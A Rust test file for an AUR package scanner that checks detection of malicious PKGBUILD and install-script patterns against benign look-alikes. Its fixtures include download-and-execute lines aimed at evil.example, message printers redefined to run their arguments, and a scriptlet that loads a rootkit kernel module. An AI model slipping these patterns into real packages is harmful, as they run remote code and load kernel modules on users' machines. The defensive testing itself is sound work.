//! Detection hardening for package-wide scanning (audit 2026-10): redefined
//! message printers, files the package reaches but never declares, and kernel
//! module commands in install scriptlets.
//!
//! Each case is checked both ways: the malicious form fires, and the closest
//! benign form does not.

use aur_scanner_core::{Registry, Scanner, Severity};

const HEAD: &str = "pkgname=zz\npkgver=1\npkgrel=1\narch=(any)\nsource=()\n";

/// Scan a package directory made of `files` (name, content); the first entry
/// must be the PKGBUILD body (the header is prepended).
async fn scan(files: &[(&str, &str)]) -> Vec<(String, Severity)> {
    let dir = tempfile::tempdir().expect("tempdir");
    for (name, content) in files {
        let text = if *name == "PKGBUILD" {
            format!("{HEAD}{content}")
        } else {
            (*content).to_string()
        };
        std::fs::write(dir.path().join(name), text).unwrap();
    }
    let scanner = Scanner::with_defaults().expect("scanner");
    let res = scanner
        .scan_pkgbuild(&dir.path().join("PKGBUILD"), Registry::None)
        .await
        .expect("scan");
    res.findings
        .into_iter()
        .map(|f| (f.id, f.severity))
        .collect()
}

fn sev(f: &[(String, Severity)], id: &str) -> Option<Severity> {
    f.iter().filter(|(i, _)| i == id).map(|(_, s)| *s).max()
}

fn critical(f: &[(String, Severity)]) -> bool {
    f.iter().any(|(_, s)| *s == Severity::Critical)
}

// --- redefined printers ------------------------------------------------------

#[tokio::test]
async fn redefined_warning_runs_its_arguments_in_an_install_script() {
    let f = scan(&[
        ("PKGBUILD", "install=zz.install\npackage() { true; }\n"),
        (
            "zz.install",
            "warning() {\n  \"$@\" | sh\n}\npost_install() {\n  warning curl -s https://evil.example/x\n}\n",
        ),
    ])
    .await;
    assert_eq!(sev(&f, "OBF-012"), Some(Severity::Critical), "{f:?}");
    assert_eq!(sev(&f, "EXEC-REMOTE"), Some(Severity::Critical), "{f:?}");
    assert_eq!(sev(&f, "DLE-001"), Some(Severity::Critical), "{f:?}");
}

#[tokio::test]
async fn redefined_plain_and_note_and_msg2_are_code() {
    let f = scan(&[(
        "PKGBUILD",
        "plain() { \"$@\" | sh; }\nprepare() { plain wget -qO- https://evil.example/x; }\n",
    )])
    .await;
    assert_eq!(sev(&f, "DLE-002"), Some(Severity::Critical), "{f:?}");
    assert_eq!(sev(&f, "OBF-012"), Some(Severity::Critical), "{f:?}");

    let f = scan(&[(
        "PKGBUILD",
        "note() { sh -c \"$1\"; }\npackage() {\n  note \"curl -s https://evil.example/x | sh\"\n}\n",
    )])
    .await;
    assert_eq!(sev(&f, "OBF-012"), Some(Severity::Critical), "{f:?}");
    assert_eq!(sev(&f, "DLE-001"), Some(Severity::Critical), "{f:?}");

    // With eval in the body the fetch must still be Critical, not OBF-002 High.
    let f = scan(&[(
        "PKGBUILD",
        "msg2() { eval \"$1\"; }\npackage() {\n  msg2 \"curl -s https://evil.example/x | sh\"\n}\n",
    )])
    .await;
    assert_eq!(sev(&f, "DLE-001"), Some(Severity::Critical), "{f:?}");
}

#[tokio::test]
async fn redefinition_in_one_file_applies_to_calls_in_another() {
    let f = scan(&[
        (
            "PKGBUILD",
            "install=zz.install\npackage() { true; }\npost_install() { :; }\n",
        ),
        (
            "zz.install",
            "msg() { eval \"$@\"; }\npost_install() {\n  msg 'curl -s https://evil.example/x | sh'\n}\n",
        ),
    ])
    .await;
    assert_eq!(sev(&f, "DLE-001"), Some(Severity::Critical), "{f:?}");
    // And the other direction: PKGBUILD defines, the scriptlet calls.
    let f = scan(&[
        (
            "PKGBUILD",
            "install=zz.install\nwarning() { \"$@\" | sh; }\npackage() { true; }\n",
        ),
        (
            "zz.install",
            "post_install() {\n  warning curl -s https://evil.example/x\n}\n",
        ),
    ])
    .await;
    assert_eq!(sev(&f, "EXEC-REMOTE"), Some(Severity::Critical), "{f:?}");
}

#[tokio::test]
async fn unmodified_printers_and_benign_wrappers_stay_inert() {
    // A real `note` printing text that mentions a fetch is still just text.
    let f = scan(&[(
        "PKGBUILD",
        "package() {\n  note \"curl -s https://example.org/x | sh is what upstream suggests\"\n}\n",
    )])
    .await;
    assert!(sev(&f, "DLE-001").is_none(), "{f:?}");
    assert!(sev(&f, "OBF-012").is_none(), "{f:?}");
    assert!(!critical(&f), "{f:?}");

    // A redefinition that only wraps a real print is not an execution sink.
    let f = scan(&[(
        "PKGBUILD",
        "msg() { echo \"==> $1\" >&2; }\npackage() {\n  msg \"curl -s https://example.org/x | sh is what upstream suggests\"\n}\n",
    )])
    .await;
    assert!(sev(&f, "OBF-012").is_none(), "{f:?}");
    assert!(sev(&f, "DLE-001").is_none(), "{f:?}");
}

// --- undeclared files --------------------------------------------------------

#[tokio::test]
async fn extensionless_file_run_through_startdir_is_scanned() {
    let f = scan(&[
        (
            "PKGBUILD",
            "package() {\n  bash \"$startdir/build.cfg\"\n}\n",
        ),
        ("build.cfg", "curl -s https://evil.example/x | sh\n"),
    ])
    .await;
    assert_eq!(sev(&f, "DLE-001"), Some(Severity::Critical), "{f:?}");
}

#[tokio::test]
async fn dotfile_sourced_through_startdir_is_scanned() {
    let f = scan(&[
        ("PKGBUILD", "package() {\n  . \"$startdir/.cfg\"\n}\n"),
        (".cfg", "curl -s https://evil.example/x | sh\n"),
    ])
    .await;
    assert_eq!(sev(&f, "DLE-001"), Some(Severity::Critical), "{f:?}");
}

#[tokio::test]
async fn nested_path_reached_through_srcdir_is_scanned() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("PKGBUILD"),
        format!("{HEAD}package() {{\n  sh \"${{srcdir}}/conf/run\"\n}}\n"),
    )
    .unwrap();
    std::fs::create_dir(dir.path().join("conf")).unwrap();
    std::fs::write(
        dir.path().join("conf/run"),
        "curl -s https://evil.example/x | sh\n",
    )
    .unwrap();
    let res = Scanner::with_defaults()
        .unwrap()
        .scan_pkgbuild(&dir.path().join("PKGBUILD"), Registry::None)
        .await
        .unwrap();
    assert!(res.findings.iter().any(|f| f.id == "DLE-001"));
}

#[tokio::test]
async fn plain_text_and_binary_files_do_not_raise_findings() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("PKGBUILD"),
        format!("{HEAD}package() {{ :; }}\n"),
    )
    .unwrap();
    std::fs::write(
        dir.path().join("NOTES"),
        "curl is a tool for fetching URLs.\n",
    )
    .unwrap();
    std::fs::write(dir.path().join(".hidden"), "just a note\n").unwrap();
    // Not text: NUL-heavy, non-printable. Left to the BIN checks, not read as script.
    let blob: Vec<u8> = (0..4096u32)
        .map(|i| {
            if i % 3 == 0 {
                0
            } else {
                0x80 + (i % 100) as u8
            }
        })
        .collect();
    std::fs::write(dir.path().join("data.bin"), blob).unwrap();
    let res = Scanner::with_defaults()
        .unwrap()
        .scan_pkgbuild(&dir.path().join("PKGBUILD"), Registry::None)
        .await
        .unwrap();
    assert!(
        res.findings
            .iter()
            .all(|f| !f.severity.is_at_least(Severity::Medium)),
        "{:?}",
        res.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
    let names: Vec<String> = res
        .scanned_files
        .iter()
        .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
        .collect();
    assert!(names.contains(&"NOTES".to_string()), "{names:?}");
    assert!(names.contains(&".hidden".to_string()), "{names:?}");
    assert!(!names.contains(&"data.bin".to_string()), "{names:?}");
}

// --- kernel modules in scriptlets -------------------------------------------

#[tokio::test]
async fn insmod_of_a_package_path_in_a_scriptlet_is_critical() {
    let f = scan(&[
        ("PKGBUILD", "install=zz.install\npackage() { true; }\n"),
        (
            "zz.install",
            "post_install() {\n  insmod /usr/lib/zz/rootkit.ko\n}\n",
        ),
    ])
    .await;
    assert_eq!(sev(&f, "PRIV-009"), Some(Severity::Critical), "{f:?}");
}

#[tokio::test]
async fn modprobe_of_a_module_the_package_ships_is_critical() {
    let f = scan(&[
        (
            "PKGBUILD",
            "install=zz.install\npackage() {\n  install -Dm644 zzrk.ko \"$pkgdir/usr/lib/modules/extramodules/zzrk.ko\"\n}\n",
        ),
        ("zz.install", "post_install() {\n  modprobe zzrk\n}\n"),
    ])
    .await;
    assert_eq!(sev(&f, "PRIV-009"), Some(Severity::Critical), "{f:?}");
}

#[tokio::test]
async fn ordinary_modprobe_is_high_and_depmod_or_dkms_stay_low() {
    let f = scan(&[
        ("PKGBUILD", "install=zz.install\npackage() { true; }\n"),
        ("zz.install", "post_install() {\n  modprobe loop\n}\n"),
    ])
    .await;
    assert_eq!(sev(&f, "PRIV-005"), Some(Severity::High), "{f:?}");
    assert!(sev(&f, "PRIV-009").is_none(), "{f:?}");

    let f = scan(&[
        ("PKGBUILD", "install=zz.install\npackage() { true; }\n"),
        (
            "zz.install",
            "post_install() {\n  depmod -a\n  dkms install -m zz -v 1\n}\n",
        ),
    ])
    .await;
    assert!(sev(&f, "PRIV-005").is_none(), "{f:?}");
    assert!(sev(&f, "PRIV-009").is_none(), "{f:?}");
    assert!(
        f.iter().all(|(_, s)| !s.is_at_least(Severity::High)),
        "depmod/dkms must not rise above Medium: {f:?}"
    );
}

#[tokio::test]
async fn printed_modprobe_instruction_is_not_a_module_operation() {
    let f = scan(&[
        ("PKGBUILD", "install=zz.install\npackage() { true; }\n"),
        (
            "zz.install",
            "post_install() {\n  echo \"run: modprobe zz to load it\"\n}\n",
        ),
    ])
    .await;
    assert!(sev(&f, "PRIV-005").is_none(), "{f:?}");
    assert!(sev(&f, "PRIV-009").is_none(), "{f:?}");
}
